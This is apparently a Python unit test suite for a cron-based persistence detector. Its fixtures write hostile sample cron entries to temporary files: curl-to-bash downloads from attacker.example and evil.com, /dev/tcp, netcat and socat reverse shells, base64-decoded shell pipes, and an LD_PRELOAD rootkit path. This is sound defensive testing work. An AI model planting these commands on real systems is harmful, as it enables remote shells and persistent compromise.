import os
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from persisthunt.detectors.cron import CronDetector
from persisthunt.findings import FindingCollection, Finding, Severity

class TestCronDetector(unittest.TestCase):
    def setUp(self):
        self.temp_dir = TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

        # Build directory structure
        self.etc = self.root / "etc"
        self.etc.mkdir()
        self.cron_d = self.etc / "cron.d"
        self.cron_d.mkdir()
        self.cron_daily = self.etc / "cron.daily"
        self.cron_daily.mkdir()
        self.spool = self.root / "var" / "spool" / "cron" / "crontabs"
        self.spool.mkdir(parents=True)

    def tearDown(self):
        self.temp_dir.cleanup()

    def _get_detector(self):
        return CronDetector(
            root_prefix=self.root,
            system_crontab=self.etc / "crontab",
            cron_d_dir=self.cron_d,
            script_dirs=[self.cron_daily],
            spool_dirs=[self.spool],
        )

    def test_empty_system_returns_empty_collection(self):
        detector = self._get_detector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_missing_directories_do_not_crash(self):
        # Point to completely nonexistent paths
        detector = CronDetector(
            system_crontab=self.root / "nonexistent_crontab",
            cron_d_dir=self.root / "nonexistent_d",
            script_dirs=[self.root / "nonexistent_daily"],
            spool_dirs=[self.root / "nonexistent_spool"],
        )
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_benign_administrative_cron_entries(self):
        # System crontab with benign entries
        crontab_content = (
            "# Standard benign crontab\n"
            "SHELL=/bin/sh\n"
            "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
            "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
            "25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n"
            "47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n"
            "52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n"
        )
        (self.etc / "crontab").write_text(crontab_content)

        # Benign cron.daily script
        daily_script = (
            "#!/bin/sh\n"
            "# Logrotate script\n"
            "/usr/sbin/logrotate /etc/logrotate.conf\n"
        )
        (self.cron_daily / "logrotate").write_text(daily_script)

        # Benign user crontab
        user_crontab = (
            "# User backups\n"
            "0 2 * * * /usr/bin/rsync -a /home/user/docs /mnt/backup/docs\n"
        )
        (self.spool / "alice").write_text(user_crontab)

        detector = self._get_detector()
        findings = detector.scan()

        # No suspicious indicators should be flagged
        self.assertEqual(findings.count(), 0)

    def test_suspicious_download_pipe_indicator(self):
        # curl piped to bash in cron.d
        cron_content = "* * * * * root curl -s https://attacker.example/setup.sh | bash\n"
        (self.cron_d / "malicious").write_text(cron_content)

        detector = self._get_detector()
        findings = detector.scan()

        self.assertGreaterEqual(findings.count(), 1)
        piped_findings = [f for f in findings if f.id == "PH-CRON-002"]
        self.assertEqual(len(piped_findings), 1)
        self.assertEqual(piped_findings[0].severity, Severity.HIGH)
        self.assertIn("curl", piped_findings[0].evidence)
        self.assertIn("bash", piped_findings[0].evidence)
        self.assertIn(str(self.cron_d / "malicious"), piped_findings[0].location)

    def test_suspicious_standalone_curl_wget_indicator(self):
        # wget without shell pipe in user crontab
        user_crontab = "0 * * * * wget -q https://internal.example/telemetry -O /var/log/telemetry.log\n"
        (self.spool / "bob").write_text(user_crontab)

        detector = self._get_detector()
        findings = detector.scan()

        wget_findings = [f for f in findings if f.id == "PH-CRON-002"]
        self.assertEqual(len(wget_findings), 1)
        self.assertEqual(wget_findings[0].severity, Severity.MEDIUM)
        self.assertIn("wget", wget_findings[0].evidence)

    def test_suspicious_network_socket_reverse_shell(self):
        # /dev/tcp in system crontab
        crontab_content = "* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        (self.etc / "crontab").write_text(crontab_content)

        detector = self._get_detector()
        findings = detector.scan()

        tcp_findings = [f for f in findings if f.id == "PH-CRON-001"]
        self.assertEqual(len(tcp_findings), 1)
        self.assertEqual(tcp_findings[0].severity, Severity.HIGH)
        self.assertIn("/dev/tcp", tcp_findings[0].evidence)

    def test_suspicious_netcat_and_socat_indicators(self):
        # nc and socat in cron.d
        cron_content = (
            "0 * * * * root nc -e /bin/bash 192.168.1.50 9001\n"
            "@reboot root socat exec:'bash -li',pty,stderr tcp:192.168.1.50:9002\n"
        )
        (self.cron_d / "nettools").write_text(cron_content)

        detector = self._get_detector()
        findings = detector.scan()

        nc_findings = [f for f in findings if f.id == "PH-CRON-001"]
        self.assertEqual(len(nc_findings), 2)
        for f in nc_findings:
            self.assertEqual(f.severity, Severity.HIGH)

    def test_suspicious_inline_script_execution(self):
        # python -c and perl -e
        cron_content = (
            "*/5 * * * * root python3 -c 'import urllib.request; print(1)'\n"
            "*/10 * * * * root perl -e 'print qq(heartbeat)'\n"
            "*/15 * * * * root bash -c 'echo inline'\n"
        )
        (self.cron_d / "inline").write_text(cron_content)

        detector = self._get_detector()
        findings = detector.scan()

        inline_findings = [f for f in findings if f.id == "PH-CRON-004"]
        self.assertEqual(len(inline_findings), 3)
        for f in inline_findings:
            self.assertEqual(f.severity, Severity.MEDIUM)

    def test_suspicious_base64_decode_indicator(self):
        cron_content = "* * * * * root echo 'c2xlZXAgMQ==' | base64 -d | sh\n"
        (self.cron_d / "b64").write_text(cron_content)

        detector = self._get_detector()
        findings = detector.scan()

        b64_findings = [f for f in findings if f.id == "PH-CRON-005"]
        self.assertEqual(len(b64_findings), 1)
        self.assertEqual(b64_findings[0].severity, Severity.HIGH)

    def test_suspicious_temp_directory_execution(self):
        # Cron job executing out of /tmp/
        cron_content = "0 0 * * * root /tmp/persist_script.sh\n"
        (self.cron_d / "temp_exec").write_text(cron_content)

        # User cron referencing /dev/shm/
        user_crontab = "0 12 * * * /dev/shm/agent.py\n"
        (self.spool / "charlie").write_text(user_crontab)

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-CRON-003"]
        self.assertEqual(len(temp_findings), 2)
        for f in temp_findings:
            self.assertEqual(f.severity, Severity.MEDIUM)

    def test_scheduled_script_directory_indicators(self):
        # Script in /etc/cron.daily containing suspicious reverse shell
        script_file = self.cron_daily / "syscheck"
        script_file.write_text(
            "#!/bin/bash\n"
            "# System check script\n"
            "if [ -f /tmp/test ]; then\n"
            "    curl -s http://internal.net/sync | bash\n"
            "fi\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        # Should detect /tmp/ and curl | bash
        f_ids = {f.id for f in findings}
        self.assertIn("PH-CRON-002", f_ids)
        self.assertIn("PH-CRON-003", f_ids)

    def test_hidden_file_in_cron_directory(self):
        # Hidden file in /etc/cron.d/
        hidden_file = self.cron_d / ".hidden_job"
        hidden_file.write_text("* * * * * root /usr/bin/touch /tmp/hidden\n")

        detector = self._get_detector()
        findings = detector.scan()

        hidden_findings = [f for f in findings if f.id == "PH-CRON-006"]
        self.assertEqual(len(hidden_findings), 1)
        self.assertEqual(hidden_findings[0].severity, Severity.MEDIUM)
        self.assertIn(".hidden_job", hidden_findings[0].evidence)

    def test_broken_symlink_in_cron_directory(self):
        broken_link = self.cron_daily / "broken_job"
        broken_link.symlink_to("/nonexistent/target/path")

        detector = self._get_detector()
        findings = detector.scan()

        broken_findings = [f for f in findings if f.id == "PH-CRON-091"]
        self.assertEqual(len(broken_findings), 1)
        self.assertEqual(broken_findings[0].severity, Severity.LOW)
        self.assertIn("broken_job", broken_findings[0].location)

    def test_malformed_cron_entries(self):
        # Incomplete cron entry in /etc/crontab
        crontab_content = (
            "not enough tokens\n"
            "@reboot\n"
        )
        (self.etc / "crontab").write_text(crontab_content)

        detector = self._get_detector()
        findings = detector.scan()

        malformed_findings = [f for f in findings if f.id == "PH-CRON-092"]
        self.assertEqual(len(malformed_findings), 2)
        for f in malformed_findings:
            self.assertEqual(f.severity, Severity.LOW)

    def test_permission_denied_handling(self):
        # Emulate PermissionError when reading spool directory
        with patch("os.scandir", side_effect=PermissionError("Permission denied")):
            detector = self._get_detector()
            findings = detector.scan()

            # Scanner should not crash and should produce INFO diagnostic finding
            perm_findings = [f for f in findings if f.id == "PH-CRON-090"]
            self.assertGreaterEqual(len(perm_findings), 1)
            self.assertEqual(perm_findings[0].severity, Severity.INFO)
            self.assertIn("permission denied", perm_findings[0].title.lower())

    def test_root_prefix_default_paths(self):
        # Using root_prefix with default subpaths
        (self.etc / "crontab").write_text("* * * * * root curl -s https://evil.com | bash\n")
        detector = CronDetector(root_prefix=self.root)
        findings = detector.scan()
        self.assertEqual(findings.count(), 1)
        self.assertEqual(list(findings)[0].id, "PH-CRON-002")

    def test_suspicious_env_var_in_crontab(self):
        (self.etc / "crontab").write_text("LD_PRELOAD=/tmp/rootkit.so\n")
        detector = self._get_detector()
        findings = detector.scan()
        temp_findings = [f for f in findings if f.id == "PH-CRON-003"]
        self.assertEqual(len(temp_findings), 1)

    def test_binary_executable_in_cron_script_dir(self):
        binary_file = self.cron_daily / "custom_binary"
        binary_file.write_bytes(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00")
        detector = self._get_detector()
        findings = detector.scan()
        bin_findings = [f for f in findings if f.id == "PH-CRON-006"]
        self.assertEqual(len(bin_findings), 1)
        self.assertIn("Binary executable", bin_findings[0].title)

    def test_read_only_safety_preserves_files(self):
        test_file = self.cron_d / "safe_job"
        original_content = "0 5 * * * root /usr/bin/backup.sh\n"
        test_file.write_text(original_content)
        mtime_before = test_file.stat().st_mtime_ns

        detector = self._get_detector()
        findings = detector.scan()

        self.assertEqual(test_file.read_text(), original_content)
        self.assertEqual(test_file.stat().st_mtime_ns, mtime_before)

    def test_unreadable_individual_crontab_file(self):
        test_file = self.cron_d / "secret_job"
        test_file.write_text("* * * * * root /usr/bin/true\n")

        original_open = open

        def mock_open(file, *args, **kwargs):
            if str(file) == str(test_file):
                raise PermissionError("Access denied")
            return original_open(file, *args, **kwargs)

        with patch("builtins.open", side_effect=mock_open):
            detector = self._get_detector()
            findings = detector.scan()

            perm_findings = [f for f in findings if f.id == "PH-CRON-090"]
            self.assertEqual(len(perm_findings), 1)
            self.assertEqual(perm_findings[0].location, str(test_file))

    def test_real_system_scan_does_not_crash(self):
        # Running default CronDetector on host should execute safely without unhandled errors
        detector = CronDetector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        # Verify findings adhere to Finding contract
        for f in findings:
            self.assertIsInstance(f, Finding)
            self.assertTrue(f.id.startswith("PH-CRON-"))
            self.assertIsInstance(f.severity, Severity)

if __name__ == "__main__":
    unittest.main()

